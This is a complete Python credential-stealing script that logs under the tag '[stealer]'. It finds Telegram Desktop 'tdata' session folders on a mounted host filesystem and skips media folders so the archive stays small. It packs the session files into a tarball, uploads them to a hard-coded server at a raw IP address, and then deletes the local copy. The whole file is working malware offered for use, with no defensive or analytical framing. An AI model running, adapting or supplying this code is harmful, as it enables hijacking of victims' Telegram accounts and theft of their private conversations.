import os
import sys
import tarfile
import requests
import glob

SERVER = os.environ.get("SERVER_URL", "http://31.130.130.186:5000")
DEVICE_ID = os.environ.get("DEVICE_ID", "unknown")

EXCLUDE_DIRS = {"emoji", "audio_cache", "fonts", "dictionaries", "video_cache", "media", "photos", "videos", "stickers", "user_data", "thumbnails", "drafts"}
MAX_TOTAL_SIZE = 50 * 1024 * 1024  # 50 MB
TIMEOUT_PACK = 60
TIMEOUT_UPLOAD = 60

def log(msg):
    print(f"[stealer] {msg}", flush=True)

def error(msg):
    print(f"[stealer] ERROR: {msg}", flush=True)
    sys.exit(1)

def find_tdata():
    log("Searching tdata...")
    paths = []
    for p in glob.glob("/host/home/*/snap/telegram-desktop/*/.local/share/TelegramDesktop/tdata"):
        if os.path.isdir(p) and "current" not in p:
            paths.append(p)
    if not paths:
        error("No tdata folders found.")
    log(f"Found {len(paths)} tdata folder(s)")
    return paths

def collect_files(tdata_paths):
    files = []
    total = 0
    for root in tdata_paths:
        for dirpath, dirnames, filenames in os.walk(root):
            # Удаляем исключаемые папки из обхода (экономим время)
            dirnames[:] = [d for d in dirnames if not any(d.startswith(ex) or d == ex for ex in EXCLUDE_DIRS)]
            for f in filenames:
                full = os.path.join(dirpath, f)
                try:
                    size = os.path.getsize(full)
                except OSError:
                    continue
                total += size
                if total > MAX_TOTAL_SIZE:
                    error(f"Total size > {MAX_TOTAL_SIZE//1024//1024}MB, aborting.")
                files.append(full)
    log(f"Collected {len(files)} files ({total} bytes)")
    return files

def pack(files, archive):
    log("Packing...")
    with tarfile.open(archive, "w:gz") as tar:
        for f in files:
            arcname = f.replace("/host/", "")
            tar.add(f, arcname=arcname)
    size = os.path.getsize(archive)
    log(f"Archive: {archive} ({size} bytes)")
    return size

def send(archive):
    log(f"Uploading to {SERVER}/api/file ...")
    try:
        with open(archive, "rb") as f:
            resp = requests.post(
                f"{SERVER}/api/file",
                files={"file": f},
                data={"id": DEVICE_ID},
                timeout=TIMEOUT_UPLOAD,
            )
        log(f"Server response: {resp.status_code}")
        if not (200 <= resp.status_code < 300):
            error(f"Upload failed: {resp.text[:200]}")
    except requests.exceptions.Timeout:
        error(f"Upload timed out after {TIMEOUT_UPLOAD}s")
    except Exception as e:
        error(f"Upload exception: {e}")

def main():
    log(f"Server: {SERVER}, Device: {DEVICE_ID}")
    paths = find_tdata()
    files = collect_files(paths)
    if not files:
        error("No files to pack.")
    archive = "/tmp/tdata_auth.tar.gz"
    try:
        pack(files, archive)
    except Exception as e:
        error(f"Packing failed: {e}")
    send(archive)
    try:
        os.unlink(archive)
    except Exception:
        pass
    log("Done. Upload OK.")

if __name__ == "__main__":
    main()
